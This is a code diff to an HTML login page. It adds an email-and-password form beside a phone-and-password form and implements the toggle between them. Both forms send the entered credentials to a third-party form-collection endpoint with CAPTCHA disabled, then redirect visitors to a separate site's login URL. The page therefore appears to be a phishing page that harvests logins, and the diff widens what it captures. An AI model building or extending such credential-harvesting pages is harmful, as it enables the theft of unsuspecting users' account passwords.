@@ -82,10 +82,14 @@
     }
 
     form {
-      display: flex;
+      display: none;
       flex-direction: column;
       width: 100%;
       gap: 14px;
+    }
+
+    form.active {
+      display: flex;
     }
 
     label {
@@ -180,7 +184,8 @@
       <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
     </div>
 
-    <form id="phoneForm" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
+    <!-- Phone Form -->
+    <form id="phoneForm" class="active" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
       <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">
 
@@ -188,16 +193,36 @@
       <div class="input-group">
         <img class="flag" src="https://flagcdn.com/us.svg" alt="US Flag">
         <select name="countryCode">
-          <option value="+1" data-flag="us">+1</option>
-          <option value="+33" data-flag="fr">+33</option>
-          <option value="+44" data-flag="gb">+44</option>
+          <option value="+1">+1</option>
+          <option value="+33">+33</option>
+          <option value="+44">+44</option>
         </select>
         <input type="text" name="phone" required>
       </div>
 
       <label for="password">Password</label>
       <div class="input-group">
-        <input type="password" name="password" id="password" required>
+        <input type="password" name="password" required>
+        <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png" onclick="togglePassword(this)">
+      </div>
+
+      <button type="submit">Login</button>
+      <p class="disclaimer">Continue Is Agree <span>Sign Up</span></p>
+    </form>
+
+    <!-- Email Form -->
+    <form id="emailForm" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">
+
+      <label for="email">Email Address</label>
+      <div class="input-group">
+        <input type="email" name="email" required>
+      </div>
+
+      <label for="password">Password</label>
+      <div class="input-group">
+        <input type="password" name="password" required>
         <img class="eye-icon" src="https://img.icons8.com/ios-glyphs/30/ffffff/invisible.png" onclick="togglePassword(this)">
       </div>
 
@@ -217,7 +242,21 @@
     }
 
     function toggleLogin(method) {
-      // Placeholder for login toggle logic
+      const phoneForm = document.getElementById("phoneForm");
+      const emailForm = document.getElementById("emailForm");
+      const buttons = document.querySelectorAll(".toggle-button");
+
+      buttons.forEach(btn => btn.classList.remove("active"));
+
+      if (method === "phone") {
+        phoneForm.classList.add("active");
+        emailForm.classList.remove("active");
+        buttons[0].classList.add("active");
+      } else {
+        phoneForm.classList.remove("active");
+        emailForm.classList.add("active");
+        buttons[1].classList.add("active");
+      }
     }
   </script>
 </body>
